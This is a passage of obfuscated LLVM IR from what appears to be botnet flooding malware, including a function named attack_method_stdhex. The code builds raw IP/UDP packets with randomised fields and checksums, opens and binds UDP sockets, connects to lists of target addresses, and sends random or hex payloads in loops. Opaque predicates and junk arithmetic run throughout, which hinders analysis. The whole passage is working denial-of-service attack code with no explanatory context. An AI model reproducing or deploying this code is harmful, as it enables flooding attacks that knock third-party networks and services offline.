  %607 = or i8 %606, 5
  store i8 %607, i8* %604, align 4
  %608 = load i8, i8* %12, align 1
  %609 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 1
  store i8 %608, i8* %610, align 1
  %611 = load i32, i32* %18, align 4
  %612 = sext i32 %611 to i64
  %_27 = sub i64 28, %612
  %gen28 = mul i64 %_27, %612
  %_29 = sub i64 0, 28
  %gen30 = add i64 %_29, %612
  %_31 = sub i64 0, 28
  %gen32 = add i64 %_31, %612
  %_33 = sub i64 28, %612
  %gen34 = mul i64 %_33, %612
  %_35 = sub i64 0, 28
  %gen36 = add i64 %_35, %612
  %613 = add i64 28, %612
  %614 = trunc i64 %613 to i16
  %615 = call zeroext i16 @htons(i16 zeroext %614) #8
  %616 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %617 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %616, i32 0, i32 2
  store i16 %615, i16* %617, align 2
  %618 = load i16, i16* %13, align 2
  %619 = zext i16 %618 to i32
  %_37 = sub i32 0, %619
  %gen38 = add i32 %_37, -1
  %_39 = sub i32 0, %619
  %gen40 = add i32 %_39, -1
  %_41 = sub i32 %619, -1
  %gen42 = mul i32 %_41, -1
  %620 = xor i32 %619, -1
  %621 = trunc i32 %620 to i16
  %622 = call zeroext i16 @htons(i16 zeroext %621) #8
  %623 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %624 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %623, i32 0, i32 3
  store i16 %622, i16* %624, align 4
  %625 = load i8, i8* %14, align 1
  %626 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %627 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %626, i32 0, i32 5
  store i8 %625, i8* %627, align 4
  %628 = load i8, i8* %15, align 1
  %629 = icmp ne i8 %628, 0
  br label %originalBB1

originalBB46alteredBB:                            ; preds = %originalBB46, %232
  %630 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %631 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %630, i32 0, i32 6
  store i8 17, i8* %631, align 1
  %632 = call i32 @rand_next()
  %633 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %634 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %633, i32 0, i32 8
  store i32 %632, i32* %634, align 4
  %635 = load i8, i8* %20, align 1
  %636 = icmp ne i8 %635, 0
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %256
  %637 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %638 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %637, i32 0, i32 9
  %639 = load i32, i32* %638, align 4
  %640 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %641 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %640, i32 0, i32 9
  store i32 %639, i32* %641, align 4
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %407
  %642 = load i8, i8* %20, align 1
  %643 = icmp ne i8 %642, 0
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %439
  %644 = load i8*, i8** %31, align 8
  %645 = load i32, i32* %18, align 4
  call void @rand_str(i8* %644, i32 %645)
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %458
  %646 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %647 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %646, i32 0, i32 7
  store i16 0, i16* %647, align 2
  %648 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %649 = bitcast %struct.iphdr* %648 to i16*
  %650 = call zeroext i16 @checksum_generic(i16* %649, i32 20)
  %651 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %652 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %651, i32 0, i32 7
  store i16 %650, i16* %652, align 2
  %653 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %654 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %653, i32 0, i32 7
  store i16 0, i16* %654, align 2
  %655 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %656 = bitcast %struct.iphdr* %655 to i16*
  %657 = call zeroext i16 @checksum_generic(i16* %656, i32 20)
  %658 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %659 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %658, i32 0, i32 7
  store i16 %657, i16* %659, align 2
  %660 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %661 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %660, i32 0, i32 3
  store i16 0, i16* %661, align 2
  %662 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %663 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %664 = bitcast %struct.udphdr* %663 to i8*
  %665 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %666 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %665, i32 0, i32 2
  %667 = load i16, i16* %666, align 2
  %668 = load i32, i32* %18, align 4
  %669 = sext i32 %668 to i64
  %_63 = sub i64 0, 8
  %gen64 = add i64 %_63, %669
  %_65 = sub i64 0, 8
  %gen66 = add i64 %_65, %669
  %_67 = shl i64 8, %669
  %_68 = shl i64 8, %669
  %_69 = shl i64 8, %669
  %670 = add i64 8, %669
  %671 = trunc i64 %670 to i32
  %672 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %662, i8* %664, i16 zeroext %667, i32 %671)
  %673 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %674 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %673, i32 0, i32 3
  store i16 %672, i16* %674, align 2
  %675 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %676 = load i32, i32* %9, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %675, i64 %677
  %679 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %678, i32 0, i32 0
  %680 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %679, i32 0, i32 0
  store i16 2, i16* %680, align 4
  %681 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %682 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %681, i32 0, i32 9
  %683 = load i32, i32* %682, align 4
  %684 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %685 = load i32, i32* %9, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %684, i64 %686
  %688 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %687, i32 0, i32 0
  %689 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %688, i32 0, i32 2
  %690 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %689, i32 0, i32 0
  store i32 %683, i32* %690, align 4
  %691 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %692 = load i32, i32* %9, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %691, i64 %693
  %695 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %694, i32 0, i32 0
  %696 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %695, i32 0, i32 1
  store i16 0, i16* %696, align 2
  %697 = load i32, i32* %10, align 4
  %698 = load i8*, i8** %26, align 8
  %699 = load i32, i32* %18, align 4
  %700 = sext i32 %699 to i64
  %_70 = sub i64 0, 52
  %gen71 = add i64 %_70, %700
  %_72 = sub i64 52, %700
  %gen73 = mul i64 %_72, %700
  %701 = add i64 52, %700
  %702 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %703 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %704 = load i32, i32* %9, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %703, i64 %705
  %707 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %706, i32 0, i32 0
  %708 = bitcast %struct.sockaddr_in* %707 to %struct.sockaddr*
  store %struct.sockaddr* %708, %struct.sockaddr** %702, align 8
  %709 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %710 = load %struct.sockaddr*, %struct.sockaddr** %709, align 8
  %711 = call i64 @sendto(i32 %697, i8* %698, i64 %701, i32 16384, %struct.sockaddr* %710, i32 16)
  br label %originalBB62

originalBB77alteredBB:                            ; preds = %originalBB77, %541
  %712 = load i32, i32* %9, align 4
  %_78 = shl i32 %712, 1
  %_79 = sub i32 %712, 1
  %gen80 = mul i32 %_79, 1
  %713 = add nsw i32 %712, 1
  store i32 %713, i32* %9, align 4
  br label %originalBB77

originalBB84alteredBB:                            ; preds = %originalBB84, %560
  br label %originalBB84
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #7
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #7
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1294)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  %51 = icmp eq i32 %50, 65535
  br i1 %51, label %52, label %55

; <label>:52:                                     ; preds = %4
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  br label %58

; <label>:55:                                     ; preds = %4
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #8
  store i16 %57, i16* %13, align 2
  br label %58

; <label>:58:                                     ; preds = %55, %52
  store i32 0, i32* %9, align 4
  br label %59

; <label>:59:                                     ; preds = %originalBBpart256, %58
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  br i1 %63, label %64, label %318

; <label>:64:                                     ; preds = %59
  %65 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %66 = load i8**, i8*** %10, align 8
  %67 = load i32, i32* %9, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8*, i8** %66, i64 %68
  store i8* %65, i8** %69, align 8
  %70 = load i16, i16* %12, align 2
  %71 = zext i16 %70 to i32
  %72 = icmp eq i32 %71, 65535
  br i1 %72, label %73, label %98

; <label>:73:                                     ; preds = %64
  %74 = load i32, i32* @x.39
  %75 = load i32, i32* @y.40
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %73
  %82 = call i32 @rand_next()
  %83 = trunc i32 %82 to i16
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  %90 = load i32, i32* @x.39
  %91 = load i32, i32* @y.40
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %107

; <label>:98:                                     ; preds = %64
  %99 = load i16, i16* %12, align 2
  %100 = call zeroext i16 @htons(i16 zeroext %99) #8
  %101 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %102 = load i32, i32* %9, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 1
  store i16 %100, i16* %106, align 2
  br label %107

; <label>:107:                                    ; preds = %98, %originalBBpart2
  %108 = load i32, i32* @x.39
  %109 = load i32, i32* @y.40
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %107
  %116 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %117 = load i32*, i32** %11, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i32, i32* %117, i64 %119
  store i32 %116, i32* %120, align 4
  %121 = icmp eq i32 %116, -1
  %122 = load i32, i32* @x.39
  %123 = load i32, i32* @y.40
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %121, label %130, label %147

; <label>:130:                                    ; preds = %originalBBpart24
  %131 = load i32, i32* @x.39
  %132 = load i32, i32* @y.40
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %130
  %139 = load i32, i32* @x.39
  %140 = load i32, i32* @y.40
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

; <label>:147:                                    ; preds = %originalBBpart24
  %148 = load i32, i32* @x.39
  %149 = load i32, i32* @y.40
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %147
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %156, align 4
  %157 = load i16, i16* %13, align 2
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %157, i16* %158, align 2
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 0, i32* %160, align 4
  %161 = load i32*, i32** %11, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  %165 = load i32, i32* %164, align 4
  %166 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %167 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %167, %struct.sockaddr** %166, align 8
  %168 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %169 = load %struct.sockaddr*, %struct.sockaddr** %168, align 8
  %170 = call i32 @bind(i32 %165, %struct.sockaddr* %169, i32 16) #7
  %171 = icmp eq i32 %170, -1
  %172 = load i32, i32* @x.39
  %173 = load i32, i32* @y.40
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %171, label %180, label %181

; <label>:180:                                    ; preds = %originalBBpart212
  br label %181

; <label>:181:                                    ; preds = %180, %originalBBpart212
  %182 = load i32, i32* @x.39
  %183 = load i32, i32* @y.40
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %181
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 2
  %195 = load i8, i8* %194, align 4
  %196 = zext i8 %195 to i32
  %197 = icmp slt i32 %196, 32
  %198 = load i32, i32* @x.39
  %199 = load i32, i32* @y.40
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %197, label %206, label %248

; <label>:206:                                    ; preds = %originalBBpart216
  %207 = load i32, i32* @x.39
  %208 = load i32, i32* @y.40
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %206
  %215 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i32 0, i32 1
  %220 = load i32, i32* %219, align 4
  %221 = call i32 @ntohl(i32 %220) #8
  %222 = call i32 @rand_next()
  %223 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %224 = load i32, i32* %9, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i32 0, i32 2
  %228 = load i8, i8* %227, align 4
  %229 = zext i8 %228 to i32
  %230 = lshr i32 %222, %229
  %231 = add i32 %221, %230
  %232 = call i32 @htonl(i32 %231) #8
  %233 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %234 = load i32, i32* %9, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i64 %235
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %236, i32 0, i32 0
  %238 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %237, i32 0, i32 2
  %239 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %238, i32 0, i32 0
  store i32 %232, i32* %239, align 4
  %240 = load i32, i32* @x.39
  %241 = load i32, i32* @y.40
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %248

; <label>:248:                                    ; preds = %originalBBpart231, %originalBBpart216
  %249 = load i32, i32* @x.39
  %250 = load i32, i32* @y.40
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %248
  %257 = load i32*, i32** %11, align 8
  %258 = load i32, i32* %9, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds i32, i32* %257, i64 %259
  %261 = load i32, i32* %260, align 4
  %262 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %263 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %263, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 0
  %268 = bitcast %struct.sockaddr_in* %267 to %struct.sockaddr*
  store %struct.sockaddr* %268, %struct.sockaddr** %262, align 8
  %269 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %270 = load %struct.sockaddr*, %struct.sockaddr** %269, align 8
  %271 = call i32 @connect(i32 %261, %struct.sockaddr* %270, i32 16)
  %272 = icmp eq i32 %271, -1
  %273 = load i32, i32* @x.39
  %274 = load i32, i32* @y.40
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %272, label %281, label %298

; <label>:281:                                    ; preds = %originalBBpart235
  %282 = load i32, i32* @x.39
  %283 = load i32, i32* @y.40
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %281
  %290 = load i32, i32* @x.39
  %291 = load i32, i32* @y.40
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %298

; <label>:298:                                    ; preds = %originalBBpart239, %originalBBpart235
  br label %299

; <label>:299:                                    ; preds = %298
  %300 = load i32, i32* @x.39
  %301 = load i32, i32* @y.40
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %299
  %308 = load i32, i32* %9, align 4
  %309 = add nsw i32 %308, 1
  store i32 %309, i32* %9, align 4
  %310 = load i32, i32* @x.39
  %311 = load i32, i32* @y.40
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart256, label %originalBB41alteredBB

originalBBpart256:                                ; preds = %originalBB41
  br label %59

; <label>:318:                                    ; preds = %59
  %319 = load i8*, i8** @hexPayload, align 8
  %320 = call i64 @strlen(i8* %319) #10
  %321 = trunc i64 %320 to i32
  store i32 %321, i32* %22, align 4
  br label %322

; <label>:322:                                    ; preds = %originalBBpart287, %318
  %323 = load i32, i32* @x.39
  %324 = load i32, i32* @y.40
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %322
  store i32 0, i32* %9, align 4
  %331 = load i32, i32* @x.39
  %332 = load i32, i32* @y.40
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %339

; <label>:339:                                    ; preds = %originalBBpart283, %originalBBpart260
  %340 = load i32, i32* @x.39
  %341 = load i32, i32* @y.40
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %339
  %348 = load i32, i32* %9, align 4
  %349 = load i8, i8* %5, align 1
  %350 = zext i8 %349 to i32
  %351 = icmp slt i32 %348, %350
  %352 = load i32, i32* @x.39
  %353 = load i32, i32* @y.40
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %351, label %360, label %426

; <label>:360:                                    ; preds = %originalBBpart264
  %361 = load i8**, i8*** %10, align 8
  %362 = load i32, i32* %9, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds i8*, i8** %361, i64 %363
  %365 = load i8*, i8** %364, align 8
  store i8* %365, i8** %23, align 8
  %366 = load i8, i8* %15, align 1
  %367 = icmp ne i8 %366, 0
  br i1 %367, label %368, label %372

; <label>:368:                                    ; preds = %360
  %369 = load i8*, i8** %23, align 8
  %370 = load i16, i16* %14, align 2
  %371 = zext i16 %370 to i32
  call void @rand_str(i8* %369, i32 %371)
  br label %372

; <label>:372:                                    ; preds = %368, %360
  %373 = load i32, i32* @x.39
  %374 = load i32, i32* @y.40
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %372
  %381 = load i32*, i32** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds i32, i32* %381, i64 %383
  %385 = load i32, i32* %384, align 4
  %386 = load i8*, i8** %23, align 8
  %387 = load i16, i16* %14, align 2
  %388 = zext i16 %387 to i64
  %389 = call i64 @send(i32 %385, i8* %386, i64 %388, i32 16384)
  %390 = load i32*, i32** %11, align 8
  %391 = load i32, i32* %9, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds i32, i32* %390, i64 %392
